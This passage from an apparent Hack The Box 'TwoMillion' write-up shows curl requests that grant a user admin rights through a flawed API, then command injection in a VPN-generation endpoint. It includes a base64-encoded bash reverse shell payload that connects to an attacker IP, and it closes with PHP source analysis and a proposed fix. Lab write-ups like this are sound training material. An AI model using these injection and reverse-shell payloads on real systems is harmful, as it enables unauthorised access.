+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPUT &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/settings/update&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;status&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;danger&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;Invalid content type.&amp;#34;&lt;/span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It looks like we can follow the error messges to determine all the parameters required.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPUT &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/settings/update&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;status&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;danger&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;Missing parameter: email&amp;#34;&lt;/span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> curl -XPUT &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/settings/update&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;email&amp;#34;: &amp;#34;admin@2million.htb&amp;#34;}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;status&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;danger&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;Missing parameter: is_admin&amp;#34;&lt;/span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> curl -XPUT &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/settings/update&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;email&amp;#34;: &amp;#34;admin@2million.htb&amp;#34;, &amp;#34;is_admin&amp;#34;: 1}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;status&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;danger&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;Email not found.&amp;#34;&lt;/span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some trial and error we got all of the necessary parameters. Now lets try using the email we created the account with and see what happens.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPUT &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/settings/update&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;email&amp;#34;: &amp;#34;randomuser@2million.htb&amp;#34;, &amp;#34;is_admin&amp;#34;: 1}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;id&amp;#34;&lt;/span>:14,&lt;span style="color:#b8bb26">&amp;#34;username&amp;#34;&lt;/span>:&lt;span style="color:#b8bb26">&amp;#34;randomuser&amp;#34;&lt;/span>,&lt;span style="color:#b8bb26">&amp;#34;is_admin&amp;#34;&lt;/span>:1&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Great! looks like we are admin now. Let&amp;rsquo;s confirm it by sending a request to the &lt;code>/admin/auth&lt;/code> api endpoint.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XGET &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/auth&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">{&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;message&amp;#34;&lt;/span>:true&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Yup we are admin!&lt;/p>
+&lt;p>Let&amp;rsquo;s check the &lt;code>/api/v1/admin/vpn/generate&lt;/code> endpoint. Again after some trial and error we can see that it requires a &lt;code>username&lt;/code> parameter to work. Let&amp;rsquo;s give it ours and see the generated output.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/vpn/generate&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;username&amp;#34;: &amp;#34;randomuser&amp;#34;}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>client
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dev tun
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proto udp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>remote edge-eu-free-1.2million.htb &lt;span style="color:#d3869b">1337&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resolv-retry infinite
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nobind
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>persist-key
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>persist-tun
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>remote-cert-tls server
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>comp-lzo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>verb &lt;span style="color:#d3869b">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data-ciphers-fallback AES-128-CBC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tls-cipher &lt;span style="color:#b8bb26">&amp;#34;DEFAULT:@SECLEVEL=0&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>auth SHA256
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key-direction &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;ca&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>..........SNIP..........
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END OpenVPN Static key V1-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/tls-auth&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you check the vpn file generated we can see that the value of the &lt;code>username&lt;/code> parameter is reflected in there:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/vpn.webp">&lt;/figure>
+&lt;p>If proper validation is not done then we could try some injection type vulerability and check if anything is working.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="rce">RCE&lt;/h3>
+&lt;p>We can see that the username is reflecting in the vpn file generated. First I tested for rce in the &lt;code>username&lt;/code> parameter. But unfortunately the output is not showing when the username is changed so something is stopping the execution when we input rce payloads. One way w can test the rce is by using the &lt;code>sleep&lt;/code> command and check the time delay:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">time&lt;/span> curl --silent -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/vpn/generate&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;username&amp;#34;: &amp;#34;randomuser&amp;#34;}&amp;#39;&lt;/span> &amp;gt; &lt;span style="color:#fabd2f">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>________________________________________________________
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Executed in 1.81 secs fish external
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usr &lt;span style="color:#fabd2f">time&lt;/span> 8.23 millis 1.21 millis 7.03 millis
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys &lt;span style="color:#fabd2f">time&lt;/span> 7.17 millis 0.14 millis 7.03 millis
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">time&lt;/span> curl --silent -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/vpn/generate&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;username&amp;#34;: &amp;#34;randomuser;sleep 5&amp;#34;}&amp;#39;&lt;/span> &amp;gt; &lt;span style="color:#fabd2f">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>________________________________________________________
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Executed in 6.21 secs fish external
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usr &lt;span style="color:#fabd2f">time&lt;/span> 11.54 millis 1.06 millis 10.48 millis
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys &lt;span style="color:#fabd2f">time&lt;/span> 3.62 millis 0.12 millis 3.50 millis
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>See the time difference:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/rce-test.webp">&lt;/figure>
+&lt;p>Now we can confirm RCE. So let&amp;rsquo;s exploit it by adding a reverse shell payload from &lt;a href="https://www.revshells.com/">revshells.com&lt;/a>&lt;/p>
+&lt;p>Here I used base64 encoding to make the payload work without producing any errors.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/revshells.webp">&lt;/figure>
+&lt;p>We can send a POST request with the payload to get a shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl --silent -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/admin/vpn/generate&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Cookie: PHPSESSID=rkdg35h0k13lm3asa5vhjv4lt8&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;username&amp;#34;: &amp;#34;randomuser;echo \&amp;#39;&lt;/span>MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC42MC8xMjM0OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng&lt;span style="color:#fe8019">==&lt;/span>&lt;span style="color:#b8bb26">\&amp;#39;&lt;/span>| base64 -d | bash&lt;span style="color:#b8bb26">&amp;#34;}&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we got shell as &lt;code>www-data&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/revshell.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="lateral-movement-to-user">Lateral Movement to user&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>There&amp;rsquo;s a &lt;code>.env&lt;/code> file with some database credentials. We could probably use it to check the database for any valuable information or try to use the username and password to ssh into the machine (since &lt;code>admin&lt;/code> user is present in the &lt;code>/etc/passwd&lt;/code> file)&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/db-pass.webp">&lt;/figure>
+&lt;p>But before that let&amp;rsquo;s check what&amp;rsquo;s actually happening in the php files.&lt;/p>
+&lt;h3 id="source-code-analysis">Source code analysis:&lt;/h3>
+&lt;p>if you check the &lt;code>controllers/AdminController.php&lt;/code> file in the &lt;code>api/v1/admin/update/settings&lt;/code> endpoint they are already checking whether the current user is admin or not. If the &lt;code>$is_admin&lt;/code> variable is false then it simply exits. Then how we are able to visit the endpoint?&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">public&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fabd2f">update_settings&lt;/span>($router) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $db &lt;span style="color:#fe8019">=&lt;/span> Database&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">getDatabase&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_admin &lt;span style="color:#fe8019">=&lt;/span> $this&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">is_admin&lt;/span>($router);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>$is_admin) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is using the &lt;code>is_admin()&lt;/code> function to check whether we are admin and stores the return value to &lt;code>$is_admin&lt;/code> variable. Then inside and if statement its just checking &lt;code>!$is_admin&lt;/code>.
+So the &lt;code>is_admin()&lt;/code> should return either &lt;code>TRUE&lt;/code> or &lt;code>FALSE&lt;/code> right? right?&lt;/p>
+&lt;p>NOP!&lt;/p>
+&lt;p>The &lt;code>is_admin()&lt;/code> function is just returning a json output and the &lt;code>TRUE&lt;/code> and &lt;code>FALSE&lt;/code> values are just inside the json data:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">public&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fabd2f">is_admin&lt;/span>($router)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION) &lt;span style="color:#fe8019">||&lt;/span> &lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">!==&lt;/span> &lt;span style="color:#fe8019">true&lt;/span> &lt;span style="color:#fe8019">||&lt;/span> &lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;username&amp;#39;&lt;/span>])) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $db &lt;span style="color:#fe8019">=&lt;/span> Database&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">getDatabase&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $stmt &lt;span style="color:#fe8019">=&lt;/span> $db&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">query&lt;/span>(&lt;span style="color:#b8bb26">&amp;#39;SELECT is_admin FROM users WHERE username = ?&amp;#39;&lt;/span>, [&lt;span style="color:#b8bb26">&amp;#39;s&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> [$_SESSION[&lt;span style="color:#b8bb26">&amp;#39;username&amp;#39;&lt;/span>]]]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $user &lt;span style="color:#fe8019">=&lt;/span> $stmt&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">fetch_assoc&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ($user[&lt;span style="color:#b8bb26">&amp;#39;is_admin&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> header(&lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> json_encode([&lt;span style="color:#b8bb26">&amp;#39;message&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#fe8019">TRUE&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#fe8019">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> header(&lt;span style="color:#b8bb26">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> json_encode([&lt;span style="color:#b8bb26">&amp;#39;message&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#fe8019">FALSE&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So whatever the return value is the if block inside the &lt;code>update_settings()&lt;/code> function is just not going to work. Because the value of &lt;code>$is_admin&lt;/code> will never be interpreted as &lt;code>FALSE&lt;/code>.
+In order to fix the issue we have to use &lt;code>json_decode()&lt;/code> and check the value of &lt;code>message&lt;/code>. It would be something like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">``&lt;/span>`php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">public&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fabd2f">update_settings&lt;/span>($router) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $db &lt;span style="color:#fe8019">=&lt;/span> Database&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">getDatabase&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $json &lt;span style="color:#fe8019">=&lt;/span> json_decode($this&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">is_admin&lt;/span>($router));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>$json&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">message&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Hopefully this should work (I haven&amp;rsquo;t tested it).&lt;/p>
+&lt;p>Ok now let&amp;rsquo;s move on the &lt;code>controllers/VPNController.php&lt;/code> file where the &lt;code>/api/v1/admin/vpn/generate&lt;/code> endpoint is defined:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">public&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fabd2f">admin_vpn&lt;/span>($router) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">!==&lt;/span> &lt;span style="color:#fe8019">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;is_admin&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SESSION[&lt;span style="color:#b8bb26">&amp;#39;is_admin&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">!==&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SERVER[&lt;span style="color:#b8bb26">&amp;#39;CONTENT_TYPE&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SERVER[&lt;span style="color:#b8bb26">&amp;#39;CONTENT_TYPE&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">!==&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;application/json&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> json_encode([
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;status&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;danger&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;message&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;Invalid content type.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
